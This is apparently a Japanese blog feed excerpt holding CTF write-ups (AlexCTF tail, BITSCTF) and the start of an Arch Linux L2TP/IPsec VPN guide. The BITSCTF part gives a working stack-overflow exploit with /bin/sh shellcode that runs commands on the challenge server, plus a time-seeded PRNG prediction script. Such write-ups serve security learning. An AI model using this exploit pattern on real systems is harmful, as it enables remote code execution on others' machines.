<span id="cb14-26"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-26" aria-hidden="true" tabindex="-1"></a>  addr<span class="op">:</span>_ <span class="ot">&lt;-</span> getAddrInfo <span class="dt">Nothing</span> (<span class="dt">Just</span> <span class="st">&quot;195.154.53.62&quot;</span>) (<span class="dt">Just</span> <span class="st">&quot;1337&quot;</span>)</span>
<span id="cb14-27"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-27" aria-hidden="true" tabindex="-1"></a>  s <span class="ot">&lt;-</span> socket (addrFamily addr) <span class="dt">Stream</span> defaultProtocol</span>
<span id="cb14-28"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-28" aria-hidden="true" tabindex="-1"></a>  connect s (addrAddress addr)</span>
<span id="cb14-29"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-29" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-30"><a href="https://blog.myon.info/entry/2017/02/06/alexctf-writeup/#cb14-30" aria-hidden="true" tabindex="-1"></a>  socketToHandle s <span class="dt">ReadWriteMode</span> <span class="op">&gt;&gt;=</span> solver</span></code></pre></div>
<pre><code>$ stack runhaskell Main.hs
                __________
         ______/ ________ \______
       _/      ____________      \_
     _/____________    ____________\_
    /  ___________ \  / ___________  \
   /  /XXXXXXXXXXX\ \/ /XXXXXXXXXXX\  \
  /  /############/    \############\  \
  |  \XXXXXXXXXXX/ _  _ \XXXXXXXXXXX/  |
__|\_____   ___   //  \\   ___   _____/|__
[_       \     \  X    X  /     /       _]
__|     \ \                    / /     |__
[____  \ \ \   ____________   / / /  ____]
     \  \ \ \/||.||.||.||.||\/ / /  /
      \_ \ \  ||.||.||.||.||  / / _/
        \ \   ||.||.||.||.||   / /
         \_   ||_||_||_||_||   _/
           \     ........     /
            \________________/

Our system system has detected human traffic from your IP!
Please prove you are a bot
Question  1 :
16009571334449958557044155891623 * 161008553970745969749861890538566 =
2577677930251293728519863026246993767635808048267100809397832618
Question  2 :
37464153342495496305488535664548 - 257757927187169247290210372595388 =
-220293773844673750984721836930840
(...)
Question  499 :
64300502597679021169438215557183 + 93542697917022220746961898347602 =
157843200514701241916400113904785
Question  500 :
76749452529358543077576919396189 % 319214220891644749269280458687889 =
76749452529358543077576919396189
Well no human got time to solve 500 ridiculous math challenges
Congrats MR bot!
Tell your human operator flag is: ALEXCTF{1_4M_l33t_b0t}</code></pre>
<h2 id="trivia">Trivia</h2>
<h3 id="tr1-hello-there-10pt">TR1: Hello there <small>(10pt)</small></h3>
<p>IRC: #alexctf @freenode の Topic に書いてあった.</p>
<pre><code>ALEXCTF{W3_w15h_y0u_g00d_luck}</code></pre>
<h3 id="tr2-ssl-0day-20pt">TR2: SSL 0day <small>(20pt)</small></h3>
<p>有名なので答えはすぐわかったけど, <code>ALEXCTF{}</code> で囲まなくていいのに気づかなくてあれーってなってた.<br />
どーでもいいけどこれすき. <a href="https://xkcd.com/1354/">xkcd: Heartbleed Explanation</a></p>
<pre><code>heartbleed</code></pre>
<h3 id="tr3-ca-20pt">TR3: CA <small>(20pt)</small></h3>
<p>TR2と同じ理由で時間かかった… ヾ(｡&gt;﹏&lt;｡)ﾉﾞ</p>
<pre><code>letsencrypt</code></pre>
<h3 id="tr4-doesnt-our-logo-look-cool-40pt">TR4: Doesn’t our logo look cool ? <small>(40pt)</small></h3>
<p>トップページの AA をよく見ると, <code>A...L..E...X...</code> という文字が混ざっているのに気づく. Vim で <code>:%j</code> (全行結合) -&gt; <code>:%s/\v[^0-1A-Za-z{}_]//g</code> (Flag format にない文字を削除) すると出てきた.</p>
<pre><code>ALEXCTF{0UR_L0G0_R0CKS}</code></pre>
<h2 id="おわり">おわり</h2>
<p>プログラム書くのは好きなので, SC1 が一番楽しかった.<br />
でも参加した理由は BITSCTF と同じく pwn の力試しなので, ちょっと残念だった.</p>]]></summary>
</entry>
<entry>
    <title>BITSCTF writeup</title>
    <link href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/index.html" />
    <id>https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/index.html</id>
    <published>2017-02-05T12:15:00Z</published>
    <updated>2017-02-05T12:15:00Z</updated>
    <summary type="html"><![CDATA[<p><a href="https://bitsctf.bits-quark.org/">BITSCTF 2017</a> に一人チーム <a href="https://bitsctf.bits-quark.org/team/135">poepoe</a> でこっそり参加. 50 points で 166 位でした.</p>
<p>キャンプ以来少しずつ勉強してきた pwn の力試しにと登録したのだけど, 開始直後は経験のないジャンルしかなくてすぐ諦めてしまっていた.<br />
けれどもたまたま今日の夕方見たら2つ追加されてたので急いで解いた.</p>
<!--more-->
<h2 id="pwn">pwn</h2>
<h3 id="command_line-20pt">Command_Line <small>(20pt)</small></h3>
<p>x86-64 の ELF.</p>
<pre><code>$ file pwn1
pwn1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=af1191f6192afa5c46c4146c085b0d85925a28ce, not stripped

$ gdb pwn1
Reading symbols from pwn1...(no debugging symbols found)...done.
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial</code></pre>
<p><code>main()</code> 関数を見るとこんな感じ.<br />
親切にもバッファのアドレスを教えてくれた後, <code>scanf("%s")</code> でそこに入力を読み取ってるだけのプログラムだった.</p>
<pre><code>$ r2 -A pwn1
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[ ] [*] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan))
 -- Ilo ni li pona li pali e lipu. mi wile e ni: sina kama jo e musi
[0x00400470]&gt; e asm.nbytes = 0
[0x00400470]&gt; pdf @ main
            ;-- main:
/ (fcn) sym.main 63
|   sym.main ();
|           ; var int local_10h @ rbp-0x10
|              ; DATA XREF from 0x0040048d (entry0)
|           0x00400566      push rbp
|           0x00400567      mov rbp, rsp
|           0x0040056a      sub rsp, 0x10
|           0x0040056e      lea rax, qword [rbp - local_10h]
|           0x00400572      mov rsi, rax
|           0x00400575      lea rdi, qword str.0x_lx_n                 ; 0x400634 ; str.0x_lx_n ; &quot;0x%lx.&quot; @ 0x400634
|           0x0040057c      mov eax, 0
|           0x00400581      call sym.imp.printf                       ; int printf(const char *format)
|           0x00400586      lea rax, qword [rbp - local_10h]
|           0x0040058a      mov rsi, rax
|           0x0040058d      lea rdi, qword 0x0040063b                  ; 0x40063b ; &quot;%s&quot;
|           0x00400594      mov eax, 0
|           0x00400599      call sym.imp.__isoc99_scanf               ; int scanf(const char *format)
|           0x0040059e      mov eax, 0
|           0x004005a3      leave
\           0x004005a4      ret</code></pre>
<p><code>scanf()</code> で読み込む文字数等を指定していないので Stack buffer overflow が起こせる. Canary も NX bit もないので, リターンアドレスを書き換えて流し込んだシェルコードに飛ばして解いた. 接続がすぐ切れてしまうので, 予め <code>ls</code> してファイル名を確認してスクリプトから <code>cat flag</code> した.</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb3-1"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
<span id="cb3-2"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-3"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="co"># $ gdb pwn1</span></span>
<span id="cb3-4"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Reading symbols from pwn1...(no debugging symbols found)...done.</span></span>
<span id="cb3-5"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="co"># gdb-peda$ r</span></span>
<span id="cb3-6"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="co"># 0x7fffffffde50</span></span>
<span id="cb3-7"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-7" aria-hidden="true" tabindex="-1"></a><span class="co"># AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH</span></span>
<span id="cb3-8"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-8" aria-hidden="true" tabindex="-1"></a><span class="co">#</span></span>
<span id="cb3-9"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-9" aria-hidden="true" tabindex="-1"></a><span class="co"># Program received signal SIGSEGV, Segmentation fault.</span></span>
<span id="cb3-10"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-10" aria-hidden="true" tabindex="-1"></a><span class="co"># (...)</span></span>
<span id="cb3-11"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-11" aria-hidden="true" tabindex="-1"></a><span class="co"># gdb-peda$ x/gx $rsp</span></span>
<span id="cb3-12"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-12" aria-hidden="true" tabindex="-1"></a><span class="co"># 0x7fffffffde68:	0x413b414144414128</span></span>
<span id="cb3-13"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-13" aria-hidden="true" tabindex="-1"></a><span class="co"># gdb-peda$ patto 0x413b414144414128</span></span>
<span id="cb3-14"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-14" aria-hidden="true" tabindex="-1"></a><span class="co"># 4700422384665051432 found at offset: 24</span></span>
<span id="cb3-15"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-15" aria-hidden="true" tabindex="-1"></a>padding <span class="op">=</span> <span class="dv">24</span></span>
<span id="cb3-16"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-17"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-17" aria-hidden="true" tabindex="-1"></a><span class="co"># $ msfconsole</span></span>
<span id="cb3-18"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-18" aria-hidden="true" tabindex="-1"></a><span class="co"># msf &gt; use payload/linux/x64/exec </span></span>
<span id="cb3-19"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-19" aria-hidden="true" tabindex="-1"></a><span class="co"># msf payload(exec) &gt; generate -b '\x00' -t python -o CMD=/bin/sh</span></span>
<span id="cb3-20"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-20" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">=</span>  <span class="st">''</span></span>
<span id="cb3-21"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-21" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">+=</span> <span class="st">'</span><span class="ch">\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05</span><span class="st">'</span></span>
<span id="cb3-22"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-22" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">+=</span> <span class="st">'</span><span class="ch">\xef\xff\xff\xff\x48\xbb\x53\xf2\xa1\x2c\x3c\xa0\x78</span><span class="st">'</span></span>
<span id="cb3-23"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-23" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">+=</span> <span class="st">'</span><span class="ch">\x1a\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4</span><span class="st">'</span></span>
<span id="cb3-24"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-24" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">+=</span> <span class="st">'</span><span class="ch">\x39\xc9\xf9\xb5\x74\x1b\x57\x78\x3a\x9c\x8e\x5f\x54</span><span class="st">'</span></span>
<span id="cb3-25"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-25" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">+=</span> <span class="st">'</span><span class="ch">\xa0\x2b\x52\xda\x15\xc9\x01\x5f\xa0\x78\x52\xda\x14</span><span class="st">'</span></span>
<span id="cb3-26"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-26" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">+=</span> <span class="st">'</span><span class="ch">\xf3\xc4\x34\xa0\x78\x1a\x7c\x90\xc8\x42\x13\xd3\x10</span><span class="st">'</span></span>
<span id="cb3-27"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-27" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">+=</span> <span class="st">'</span><span class="ch">\x1a\x05\xa5\xe9\xa5\xda\xaf\x7d\x1a</span><span class="st">'</span></span>
<span id="cb3-28"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-28" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-29"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-29" aria-hidden="true" tabindex="-1"></a><span class="co"># r = process('./pwn1')</span></span>
<span id="cb3-30"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-30" aria-hidden="true" tabindex="-1"></a>r <span class="op">=</span> remote(<span class="st">'bitsctf.bits-quark.org'</span>, <span class="dv">1330</span>)</span>
<span id="cb3-31"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-31" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-32"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-32" aria-hidden="true" tabindex="-1"></a>addr_buffer <span class="op">=</span> <span class="bu">int</span>(r.readline()[:<span class="op">-</span><span class="dv">1</span>], <span class="dv">16</span>)</span>
<span id="cb3-33"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-33" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">'addr_buffer: 0x</span><span class="sc">%x</span><span class="st">'</span> <span class="op">%</span> addr_buffer)</span>
<span id="cb3-34"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-34" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-35"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-35" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">''</span></span>
<span id="cb3-36"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-36" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">'A'</span> <span class="op">*</span> padding</span>
<span id="cb3-37"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-37" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(addr_buffer <span class="op">+</span> padding <span class="op">+</span> <span class="dv">8</span>)</span>
<span id="cb3-38"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-38" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> shellcode</span>
<span id="cb3-39"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-39" aria-hidden="true" tabindex="-1"></a>r.sendline(payload)</span>
<span id="cb3-40"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-40" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-41"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-41" aria-hidden="true" tabindex="-1"></a><span class="co"># r.interactive()</span></span>
<span id="cb3-42"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-42" aria-hidden="true" tabindex="-1"></a>r.sendline(<span class="st">'cat flag'</span>)</span>
<span id="cb3-43"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb3-43" aria-hidden="true" tabindex="-1"></a>log.success(<span class="st">'Flag: </span><span class="sc">%s</span><span class="st">'</span> <span class="op">%</span> r.recv())</span></code></pre></div>
<pre><code>$ python2 exploit.py
[+] Opening connection to bitsctf.bits-quark.org on port 1330: Done
[*] addr_buffer: 0x7fffffffe620
[+] Flag: BITSCTF{b451c_57r416h7_f0rw4rd_5h3llc0d1n6}
[*] Closed connection to bitsctf.bits-quark.org port 1330</code></pre>
<h3 id="random-game-30pt">Random Game <small>(30pt)</small></h3>
<p>同じく x86-64 の ELF.</p>
<pre><code>$ file third
third: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6c26456447632034ed1ad87d3161adcf72daa6c3, not stripped</code></pre>
<p><code>main()</code> 関数の処理はだいたいこんな感じだった.</p>
<ol type="1">
<li><code>srand(time(0))</code></li>
<li><code>rand() &amp; 0xf</code></li>
<li><code>scanf("%d")</code> して 2 の値と比較
<ul>
<li>違ってたら <code>exit(0)</code></li>
</ul></li>
<li>2-3 を30回繰り返す</li>
<li><code>./flag</code> を <code>open()</code> -&gt; <code>read()</code> -&gt; <code>printf()</code></li>
</ol>
<p>少し悩んだけど, 乱数の seed に <code>time(0)</code> を使ってるので, サーバ側の時間がわかれば乱数を推測できそうなのに気づく.</p>
<p>問題は先程のと同じサーバで動いていると予測. まずは先程のスクリプトを使って <code>date +%s</code> を実行し, 手元の環境の時間と大きなズレがないことを確認.<br />
(注: この結果は後から実行したもの)</p>
<pre><code>$ date +%s ; python2 exploit.py
1486292363
[+] Opening connection to bitsctf.bits-quark.org on port 1330: Done
[*] addr_buffer: 0x7fffffffe620
[+] date +%s: 1486292363
[*] Closed connection to bitsctf.bits-quark.org port 1330</code></pre>
<p>あとは問題と同じ方法で30個の乱数を作る C のコードと問題を解くスクリプトを書いて終わり.</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb7-1"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
<span id="cb7-2"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
<span id="cb7-3"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;time.h&gt;</span></span>
<span id="cb7-4"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb7-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-5"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">()</span> <span class="op">{</span></span>
<span id="cb7-6"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb7-6" aria-hidden="true" tabindex="-1"></a>  srand<span class="op">(</span>time<span class="op">(</span><span class="dv">0</span><span class="op">));</span></span>
<span id="cb7-7"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb7-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-8"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb7-8" aria-hidden="true" tabindex="-1"></a>  <span class="cf">for</span> <span class="op">(</span><span class="dt">int</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> <span class="dv">30</span><span class="op">;</span> <span class="op">++</span>i<span class="op">)</span> <span class="op">{</span></span>
<span id="cb7-9"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb7-9" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;%d &quot;</span><span class="op">,</span> rand<span class="op">()</span> <span class="op">&amp;</span> <span class="bn">0xf</span><span class="op">);</span></span>
<span id="cb7-10"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb7-10" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb7-11"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb7-11" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<div class="sourceCode" id="cb8"><pre class="sourceCode ruby"><code class="sourceCode ruby"><span id="cb8-1"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">require</span> <span class="vs">'socket'</span></span>
<span id="cb8-2"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb8-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-3"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb8-3" aria-hidden="true" tabindex="-1"></a>s <span class="kw">=</span> <span class="dt">TCPSocket</span><span class="at">.new</span> <span class="vs">'bitsctf.bits-quark.org'</span>, <span class="dv">1337</span></span>
<span id="cb8-4"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb8-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-5"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb8-5" aria-hidden="true" tabindex="-1"></a>randnums <span class="kw">=</span> <span class="in">`./rand30`</span><span class="at">.split</span></span>
<span id="cb8-6"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb8-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-7"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb8-7" aria-hidden="true" tabindex="-1"></a><span class="dv">30</span><span class="at">.times</span> <span class="cf">do</span> <span class="kw">|</span>n<span class="kw">|</span></span>
<span id="cb8-8"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb8-8" aria-hidden="true" tabindex="-1"></a>  <span class="fu">print</span> s<span class="at">.gets</span> <span class="vs">'round : '</span></span>
<span id="cb8-9"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb8-9" aria-hidden="true" tabindex="-1"></a>  s<span class="at">.puts</span> randnums<span class="kw">[</span>n<span class="kw">]</span></span>
<span id="cb8-10"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb8-10" aria-hidden="true" tabindex="-1"></a>  <span class="fu">puts</span> randnums<span class="kw">[</span>n<span class="kw">]</span></span>
<span id="cb8-11"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb8-11" aria-hidden="true" tabindex="-1"></a><span class="cf">end</span></span>
<span id="cb8-12"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb8-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-13"><a href="https://blog.myon.info/entry/2017/02/05/bitsctf-writeup/#cb8-13" aria-hidden="true" tabindex="-1"></a><span class="fu">puts</span> s<span class="at">.gets</span></span></code></pre></div>
<pre><code>$ clang rand30.c -o rand30

$ ruby solve.rb
your number for 1 round : 8
your number for 2 round : 4
your number for 3 round : 9
your number for 4 round : 10
your number for 5 round : 9
your number for 6 round : 4
your number for 7 round : 6
your number for 8 round : 6
your number for 9 round : 3
your number for 10 round : 5
your number for 11 round : 15
your number for 12 round : 13
your number for 13 round : 12
your number for 14 round : 3
your number for 15 round : 15
your number for 16 round : 2
your number for 17 round : 7
your number for 18 round : 5
your number for 19 round : 6
your number for 20 round : 8
your number for 21 round : 14
your number for 22 round : 2
your number for 23 round : 12
your number for 24 round : 12
your number for 25 round : 14
your number for 26 round : 8
your number for 27 round : 13
your number for 28 round : 4
your number for 29 round : 3
your number for 30 round : 13
congrats you are rewarded with the flag BITSCTF{54m3_533d_54m3_53qu3nc</code></pre>
<p>なぜか Flag が最後まで送られてこない… 最後のワードを補完して <code>BITSCTF{54m3_533d_54m3_53qu3nc3}</code> で通った.</p>]]></summary>
</entry>
<entry>
    <title>Arch LinuxでL2TP/IPsec</title>
    <link href="https://blog.myon.info/entry/2016/08/21/arch-linux-l2tp-ipsec/index.html" />
    <id>https://blog.myon.info/entry/2016/08/21/arch-linux-l2tp-ipsec/index.html</id>
    <published>2016-08-20T16:10:00Z</published>
    <updated>2016-08-20T16:10:00Z</updated>
    <summary type="html"><![CDATA[<p>いろいろあってVPNを張りたくなったので, Arch LinuxでL2TP/IPsecなVPNサーバを構築したときのメモです.</p>
<h2 id="環境">環境</h2>
<p>図にするとこんな感じ.<br />
記事中では, この図のIPアドレス及びネットワークインターフェース名を使っていきます.<br />
<img src="https://blog.myon.info/entry/2016/08/21/arch-linux-l2tp-ipsec/l2tp-ipsec.png" alt="diagram" /></p>
<!--more-->
<p>ちなみに, サーバにはクーポンが残っていたConoHa(リニューアル前)のメモリ1GBプラン(2core-CPU, 1GB-RAM, 100GB-HDD)を使いました.</p>
<p>利用したソフトウェアとバージョンは以下のとおり.</p>
<table>
<colgroup>
<col style="width: 33%" />
<col style="width: 33%" />
<col style="width: 33%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">ソフトウェア</th>
<th style="text-align: center;">バージョン</th>
<th>メモ</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><a href="https://www.archlinux.org/">Arch Linux</a></td>
<td style="text-align: center;">-</td>
<td>最高のLinuxディストリビューション</td>
</tr>
<tr class="even">
<td style="text-align: center;"><a href="https://www.openswan.org/">Openswan</a></td>
<td style="text-align: center;">2.6.47</td>
<td>LinuxのためのIPsec(Internet Protocol Security)実装</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><a href="https://github.com/xelerance/xl2tpd">xl2tpd</a></td>
<td style="text-align: center;">1.3.7</td>
<td>LinuxのためのL2TP(Layer 2 Tunneling Protocol)実装</td>
</tr>
<tr class="even">
<td style="text-align: center;"><a href="https://ppp.samba.org/">ppp</a></td>
<td style="text-align: center;">2.4.7</td>
<td>LinuxやSolarisのためのPPP(Point-to-Point Protocol)実装</td>
</tr>
<tr class="odd">
<td style="text-align: center;">iptables</td>
<td style="text-align: center;">1.6.0</td>
<td>ファイアウォール</td>
</tr>
</tbody>
</table>
<h2 id="準備">準備</h2>
<p>必要なソフトウェアをインストール. Openswanは公式のリポジトリにないのでAURから入れました.</p>
<pre><code>$ yaourt -S iptables xl2tpd openswan</code></pre>
<p>また, いくつかのカーネルパラメータを変更するために, <code>/etc/sysctl.d/99-sysctl.conf</code>(名前は適当)を作成.</p>
<pre><code># /etc/sysctl.d/99-sysctl.conf

net.ipv4.ip_forward = 1
net.ipv4.conf.default.rp_filter = 0
net.ipv4.conf.default.accept_source_route = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0
net.ipv4.icmp_ignore_bogus_error_responses = 1</code></pre>
<p>以下のコマンドを実行して反映させます.</p>
<pre><code>$ sudo sysctl --system</code></pre>
<h2 id="サーバ側の設定">サーバ側の設定</h2>
<h3 id="openswan">Openswan</h3>
<p><code>/etc/ipsec.conf</code>の41行目, <code># Add connections here</code>の下に<code>include /etc/ipsec.d/*.conf</code>を追記.</p>
<pre class="conf"><code># /etc/ipsec.conf - Openswan IPsec configuration file

# This file:  /usr/share/doc/openswan/ipsec.conf-sample
#
# Manual:     ipsec.conf.5


version	2.0	# conforms to second version of ipsec.conf specification

# basic configuration
config setup
	# Do not set debug options to debug configuration issues!
	# plutodebug / klipsdebug = &quot;all&quot;, &quot;none&quot; or a combation from below:
	# &quot;raw crypt parsing emitting control klips pfkey natt x509 dpd private&quot;
	# eg:
	# plutodebug=&quot;control parsing&quot;
	# Again: only enable plutodebug or klipsdebug when asked by a developer
	#
	# enable to get logs per-peer
	# plutoopts=&quot;--perpeerlog&quot;
	#
	# Enable core dumps (might require system changes, like ulimit -C)
	# This is required for abrtd to work properly
	# Note: incorrect SElinux policies might prevent pluto writing the core
	dumpdir=/var/run/pluto/
	#
	# NAT-TRAVERSAL support, see README.NAT-Traversal
	nat_traversal=yes
	# exclude networks used on server side by adding %v4:!a.b.c.0/24
	# It seems that T-Mobile in the US and Rogers/Fido in Canada are
	# using 25/8 as &quot;private&quot; address space on their 3G network.
	# This range has not been announced via BGP (at least upto 2010-12-21)
	virtual_private=%v4:10.0.0.0/8,%v4:192.168.0.0/16,%v4:172.16.0.0/12,%v4:25.0.0.0/8,%v6:fd00::/8,%v6:fe80::/10
	# OE is now off by default. Uncomment and change to on, to enable.
	oe=off
	# which IPsec stack to use. auto will try netkey, then klips then mast
	protostack=auto
	# Use this to log to a file, or disable logging on embedded systems (like openwrt)
	#plutostderrlog=/dev/null

# Add connections here
include /etc/ipsec.d/*.conf</code></pre>
<p><code>/etc/ipsec.d/examples/l2tp-psk.conf</code>を<code>/etc/ipsec.d/</code>にコピー.<br />
33行目の<code>YourGatewayIP</code>の部分をサーバのIPアドレスに変更. また, 47行目以降の設定は今回必要ないので消しておきます.</p>
<pre><code>$ sudo cp /etc/ipsec.d/examples/l2tp-psk.conf /etc/ipsec.d/</code></pre>
<pre class="conf"><code># /etc/ipsec.d/l2tp-psk.conf

conn L2TP-PSK-NAT
	rightsubnet=vhost:%priv
